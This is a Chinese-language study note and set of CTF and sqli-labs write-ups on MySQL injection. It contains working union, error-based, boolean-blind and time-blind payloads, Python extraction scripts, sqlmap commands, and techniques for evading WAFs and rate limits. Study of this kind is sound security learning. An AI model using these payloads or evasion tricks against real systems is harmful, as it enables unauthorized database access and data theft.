![image-20210808170638727](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439854.png)

- sql注释

```
SQL注释

　　单行注释　　#后面直接加内容

　　　　　　　　--后面必须加空格

　　多行注释　　/**/中间可跨行

　　-- + 会删除
```



- 内联注释？

MySQL数据库为了保持与其他数据库兼容，特意新添加的功能。 为了避免从MySQL中导出的SQL语句不能被其他数据库使用，它把一些 MySQL特有的语句放在 `/*! ... */` 中，这些语句在不兼容的数据库中使用时便 不会执行。而MySQL自身却能识别、执行。  ==`/*!50001 */`表示数据库版本>=5.00.01时中间的语句才会执行。==在SQL注入中，内联注释常用来绕过waf。

⚠️不一定是哪个版本就允许了，可以写python脚本跑出来 

<span style="background:#FF9999;">这是MYSQL特性：</span>

```
/*!select * from users*/;   //可以执行
id=-1%20union%20/*!44509select*/1,2,3 //可以绕过waf

还可以
union%20all%23%0a%20select%201,2,3%23 //加不加all效果一样
```







推荐用FUZZ模糊测试=》脚本跑，一个个试效率低

```
SELECT * FROM users WHERE id=-1/*%0a*/union/*%0a*/select/*%0a*/1, 2,3;

id =-1 union%23a%0Aselect 1,2,3;%23  
也就是id =-1 union #a
select 1,2,3;#    //注意#是单行注释，a为了隔开，再加个保证


id =-1 union/*%00*/%23a%0A/*!/*!select 1,2,3*/;%23

```
#### salmap tamper
利用sqlmap tamper插件参数，对应文件夹下有各种自带脚本，我们也可以自己写然后用上
```
python sqlmap.py -u "http://127.0.0.1/test.php?id=1" --tamper=dog.py --proxy=http://127.0.0.1:8080   proxy是开启代理，可用burp查看请求信息
```
##### 绕过工具检测
⚠️sqlmap请求时useragent会带上sqlmap的指纹，安全狗检测到会拦截，==工具直接被拦截==

=》对此我们修改useragent即可绕过拦截，sqlmap也有参数修改头
`python sqlmap.py -u "http://127.0.0.1/test.php?id=1" --tamper=dog.py --proxy=http://127.0.0.1:8080 --random-agent`使用自带字典随机头访问

⚠️sqlmap太慢了可能是php版本过高，5.2.。。试试

##### 绕过流量检测

安全狗的流量防护是检测访问速度【同一ip访问多次会被ban】

=》**可以延时、代理池、爬虫** 绕过

1. 爬虫
> 百度 搜索引擎爬虫http头

- sqlmap也可以自定义useragent头
- 在sqlmap目录下`lib/core/option.py`里的1425行
- 或者加参数`--user-agent="xxx"`

2. 延时
- `--delay 1` 隔1s发一个数据包

3. 代理池

拦一个ip我换一个，python爬虫脚本有关


##### 总结
⚠️类似的，若对其他地方头有拦截，写python脚本，--tamper加上【中转脚本】

也可以`-r 3.txt`把修改后的请求报文放到txt里，不要-u，用-r请求文件也可以实现自主绕过
- 即sqlmap注入本地脚本地址，=》本地搭建脚本（请求数据包自定义编写）=》目标地址
> 百度 php自定义http数据包请求


#### 白名单绕过
1. ip白名单
获取对方服务器不会拦截的ip白名单，修改自己http header  `x-forwarded-for ..`等来绕过安全狗拦截【一般不好获取，获得对方服务器本身的ip更容易，自己不会防自己，也可以绕过】
2. 静态资源
以前可以用，现在不一定
常见的静态文件：`.js .txt .jpg  .swf  .css`等，类似白名单机制，waf为了检测效率，不会检测这类文件名后缀的请求
`http://127.0.0.1/test.php?id=1`改为`http://127.0.0.1/test.php/1.js?=1`页面不会变，但能绕过检测
⚠️==Aspx、php只识别到前面的`.Aspx、.php`后面不识别==

3. url白名单
waf内置白名单，只要url中存在白名单的字符串，就不检测

4. 爬虫白名单
通过对数据包伪造成搜索引擎访问，致使waf认为访问安全
  - `UserAgent`，修改成搜索引擎的相关指纹，waf一旦检测到这个就不去管它了，否则会因多次访问而页面显示拦截



## sql语法

1. ==[ limit语句](==https://www.yiibai.com/sql/sql-limit.html)：限制显示多少行，offset：跳过前几行

   - mysql里可以省去offset：`LIMIT x,y` ：跳过前x行取y行

2. `mid（string,start,length）`类似于substr，返回制定长度字符串子串【**字符串从1开始**】

3. `like '%aa'`  匹配以aa结尾的字符串，`%`：匹配0个/一个/多个， `_` 匹配一个 

4. [sql里的反引号](https://www.jianshu.com/p/36363f4190df)：区分保留字，以免出错，如

   ```sql
   SELECT `select` FROM `test` WHERE select='字段值'
   ```


5. 别名as xxx，as可以省略









## 🔗参考资料

[公众号，相关函数、报错注入布尔注入、时间注入，初级，配有小例子](https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&mid=2247484372&idx=1&sn=ffcc51a88c9acf96c312421b75fc2a26&chksm=ec1e33fcdb69baea53838fd545a236c0deb8a42f3b341ee0879c9e4ac9427c2147fab95b6669#rd)









# 刷题✍️

### 整数型

1. 判断是整数型还是字符型，有区别=》整数型

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439855.png" alt="image-20210719143944632" style="zoom: 50%;" /><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439856.png" alt="image-20210719144008063" style="zoom:50%;" />

2. 判断列数，order by3页面不显示，则是2列

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439857.png" alt="image-20210719144050954" style="zoom:50%;" /><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439858.png" alt="image-20210719144101587" style="zoom:50%;" />

3. union，**注意第一个参数要无效！否则union后面的不显示**

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439859.png" alt="image-20210719144344234" style="zoom:50%;" />



4. 找当前库下所有表名

```url
http://challenge-a1d9c1878cb3631f.sandbox.ctfhub.com:10800/?id=-1 union  select database(),group_concat(table_name) from information_schema.tables where table_schema=database()
```

![image-20210719144701149](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439860.png)



5. 获取特定表列名【==注意列名要加引号==】

```
?id=-1 union  select database(),group_concat(column_name) from information_schema.columns where table_name='flag'
```

![image-20210719144940366](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439861.png)

6. 获取具体数据【注意引号！】

```
?id=-1 union  select database(),flag from flag
```

![image-20210719145233031](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439862.png)



### sqli_labs字符注入

1. 发现是字符注入

联合注入：

​	- 爆库名

​	**可直接用hackbar输出，左边3是需3列才回显，右边是把输出放在第几列回显**

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439863.png" alt="image-20210523111629531" style="zoom:50%;" /><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439864.png" alt="image-20210523111656991" style="zoom: 50%;" />

```mysql
http://localhost/sqli-labs-master/Less-1/?id='union select 1,group_concat(schema_name),3 from information_schema.schemata%23
```

​	- 爆表名

```mysql
http://localhost/sqli-labs-master/Less-1/?id='union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()%23
```

​	- 爆所有库列名

```mysql
http://localhost/sqli-labs-master/Less-1/?id='union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database()%23
```

​	- 爆当前库下指定表列名

```mysql
http://localhost/sqli-labs-master/Less-1/?id='union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name='users'%23
```



无列名报错注入join查列名【这时无需保证字段数为3，直接union select 即可】

```mysql
http://localhost/sqli-labs-master/Less-1/?id='union select * from (select * from users as a join users b using(id,username))c%23
//或者加上extractvalue，效果一样
http://localhost/sqli-labs-master/Less-1/?id='union select extractvalue(0x0a,concat(0x0a,(select * from (select * from users as a join users b using(id,username))c)))%23
```

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439865.png" alt="image-20210523113654148" style="zoom:67%;" />



### 报错注入

1. 发现是整数，2列

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439866.png" alt="image-20210719153315081" style="zoom:67%;" />

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439867.png" alt="image-20210719153236931" style="zoom:67%;" /><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439868.png" alt="image-20210719153122597" style="zoom:67%;" /><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439869.png" alt="image-20210719153213247" style="zoom: 67%;" />



2. 利用**hackbar的快捷键**extractvalue报错注入

```
?id=extractvalue(0x0a,concat(0x0a,(select database())))
```

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439870.png" alt="image-20210719154014631" style="zoom:67%;" />

4. 查表名

```
?id=extractvalue(0x0a,concat(0x0a,(select group_concat(table_name) from information_schema.tables where table_schema=database())))
```

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439871.png" alt="image-20210719154125986" style="zoom:67%;" />

5. 查列名

```
?id=extractvalue(0x0a,concat(0x0a,(select group_concat(column_name) from information_schema.columns where table_schema=database())))
```

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439872.png" alt="image-20210719154218790" style="zoom:67%;" />

6. 查数据

```
?id=extractvalue(0x0a,concat(0x0a,(select group_concat(flag) from flag)))
```

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439873.png" alt="image-20210719154257406" style="zoom:67%;" />



### 布尔注入

> [wp](https://blog.csdn.net/Xxy605/article/details/109750292?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-0&spm=1001.2101.3001.4242)

1. 整数型，2列

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439874.png" alt="image-20210719155150592" style="zoom:67%;" /><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439875.png" alt="image-20210719155311112" style="zoom:67%;" />

2. 查找有无含flag列名的表=》有

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439876.png" alt="image-20210719155428893" style="zoom:80%;" />

3. 查询当前库下有几个表，【==注意！用and==，or一定返回success】=》两个表

```
?id=1 and (select count( TABLE_NAME) from information_schema.TABlES where TABLE_SCHEMA=database( ) ) =2
```

![image-20210719160304316](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439877.png)

3. 获取第一个表的长度=》4=》**怀疑表名叫flag

```
?id=1 and (select length( TABLE_NAME) from information_schema.TABlES where TABLE_SCHEMA=database( ) limit 0,1) =4
?id=1 and (select length( TABLE_NAME) from information_schema.TABlES where TABLE_SCHEMA=database( ) limit 1,1) =4  【第二个表名也是4长度】
```

![image-20210719160513618](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439878.png)



3. 查询当前数据库下两个表名第一个字母是不是f

```
?id=1 and mid((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database( ) limit 0,1) ,1,1) ='f'【第一个表报错，说明第二个表名是flag】
?id=1 and mid((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database( ) limit 1,1) ,1,1) ='f'【success】
```

![image-20210719161041707](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439879.png)

4. 后面==用python自动化脚本布尔盲注爆破==【要跑一会】

```python
重点代码：
#对指定库指定表指定列爆数据（flag）
def getData(database,table,column,str_list):
	#初始化flag长度为1
    j = 1
    #j从1开始，无限循环flag长度
    while True:
    	#flag中每一个字符的所有可能取值
        for i in str_list: #str_list是字母表的ASCII码
            new_url = url + "?id=1 and substr((select {} from {}.{}),{},1)='{}'".format(column,database,table,j,chr(i))
            r = requests.get(new_url)
            #如果返回的页面有query_success，即盲猜成功，跳过余下的for循环
            if success_mark in r.text:
            	#显示flag
                print(chr(i),end="")
                #flag的终止条件，即flag的尾端右花括号
                if chr(i) == "}":
                    print()
                    return 1
                break
        #如果没有匹配成功，flag长度+1接着循环
        j = j + 1
```

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439880.png" alt="image-20210719170950999" style="zoom:80%;" />



### 时间盲注

- sqlmap工具法： 

1. 爆库名=》发现4个库名

```
sqlmap -u http://challenge-53394f4a591385b3.sandbox.ctfhub.com:10800/?id=1 --dbs
```

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439881.png" alt="image-20210719173257617" style="zoom:80%;" />

2. 爆表名

```
sqlmap -u http://challenge-c040fe3754779bb8.sandbox.ctfhub.com:10800/?id=1 -D sqli --tables
```

![image-20210719223141434](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439882.png)

3. 爆列名

```
sqlmap -u http://challenge-c040fe3754779bb8.sandbox.ctfhub.com:10800/?id=1 -D sqli -T flag --columns
```

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439883.png" alt="image-20210719223210839" style="zoom:67%;" />

4. 爆数据

```
sqlmap -u http://challenge-c040fe3754779bb8.sandbox.ctfhub.com:10800/?id=1 -D sqli -T flag -C flag --dump
```

![image-20210719224102387](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439884.png)



- 手注法

```sql
判断当前数据库名长，发现长度为4
?id=1 and if(length(database())=4,1,sleep(3))
判断当前库下表个数，为2时停三秒,说明有两张表
?id=1 and if((select count(table_name) from information_schema.tables
 where table_schema=database())=2,sleep(3),1)
 
```



- python自动脚本

```python
# -*- coding:utf-8 -*-
import requests
import time
flag = ""
for i in range(1,50):
    min=32
    max=127
    mid=(min+max)//2
    while min<max:
        starttime = time.time()
        #pa = '1^if(ascii(substr(database(),{},1))>{},sleep(2),-1)^1'.format(str(i),str(mid)) 爆库
        #pa = "1^if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='sqli'),{},1))>{},sleep(2),-1)^1".format(str(i),str(mid)) 爆表
        #pa = "1^if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='flag'),{},1))>{},sleep(2),-1)^1".format(str(i), str(mid)) 爆列
        pa = "1^if(ascii(substr((select group_concat(flag) from flag),{},1))>{},sleep(2),-1)^1".format(str(i), str(mid))
        url = "http://challenge-c040fe3754779bb8.sandbox.ctfhub.com:10800/?id="
        ur=url+pa
        res = requests.get(ur)
        if time.time() - starttime > 2:
            min=mid+1
        else:
            max=mid
        mid = (min + max)//2
    flag+=chr(mid)
    print(flag)
    #得到flag
```





## 无列名注入例子

### SWPUCTF2019

参考：[个人博客1知识点及wp](http://www.pdsdt.lovepdsdt.com/index.php/2019/12/12/mysql/)、[个人博客2，wp更详细](https://www.cnblogs.com/wangtanzhi/p/12241499.html) 、 [information_schema外的思考](https://www.anquanke.com/post/id/193512)

==要点: information_schema被过滤，无列名注入==

#### 知识点：

1. **空格和or被过滤，我们使用注释符号来代替空格**`/**/`

2. or被过滤，我们无法使用order by及information_schema进行数据查询，我们可以使用sys数据库进行数据查询，**使用sys数据库需要满足：**

>     1.数据库版本大于等于5.7  //version()
>     2.数据库用户为root@localohost用户  //user()  【管理员身份】

3. ==！！==information_schema外，以下都可以查询表名信息【**但查询不到列名，查询列名要用无列名注入**】 [参考1](http://www.tristan.top/2020/04/22/Sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/)

   ```
   sys.schema_auto_increment_columns  //有自增id
   sys.schema_table_statistics_with_buffer //无自增id
   mysql.innodb_table_stats  //一般关闭
   
   
   //获取当前库里的表名
   ?id=-1' union all select 1,2,group_concat(table_name)from sys.schema_auto_increment_columns where table_schema=database()--+
   ?id=-1' union all select 1,2,group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema=database()--+
   ```

   

<img src="https://img2018.cnblogs.com/blog/1625650/202001/1625650-20200129212640240-1882833743.png" alt="innodb" style="zoom:67%;" />



![2](https://img2018.cnblogs.com/blog/1625650/202001/1625650-20200129212521529-1650453614.png)





查询表名：

```mysql
//用sys.schema_auto_increment_columns
11'/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/sys.schema_auto_increment_colum ns/**/where/**/table_schema=schema()),user(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'

//或者mysql.innodb_table_stats
id=-1'/**/union/**/select/**/1,(select/**/group_concat(table_name)from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'1
```

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439885.png" alt="image-20210522145658218" style="zoom:67%;" />



查询列名，发现不行，用==无列名注入==：**第一列应该为id所以从第二列找，第二列可能为name，第三列为password**

```mysql
重点：获取第二列所有行的数据：
(select group_concat(a) from (select 1,2 as a,3 union select*from users)c)  //第二列别名为a，第一列应该为id

111'/**/union/**/select/**/1，(select/**/group_concat(a)/**/from/**/(select/**/1,2/**/as/**/a,3/**/union/**/select*from/**/users)c),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'
```

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439886.png" alt="image-20210522150318206" style="zoom:67%;" />



可以看到flag在第二个，我们查询一下对应第三列的值，即可查询出flag：

```mysql
重点：(select group_concat(b) from (select 1,2,3 as b union select*from users)c) //查询flag对应第三列的值

111'/**/union/**/select/**/1,(select/**/group_concat(b)/**/from/**/(select/**/1,2,3/**/as/**/b/**/union/**/select*from/**/users)c),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'
```

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439887.png" alt="image-20210522150330829" style="zoom:67%;" />

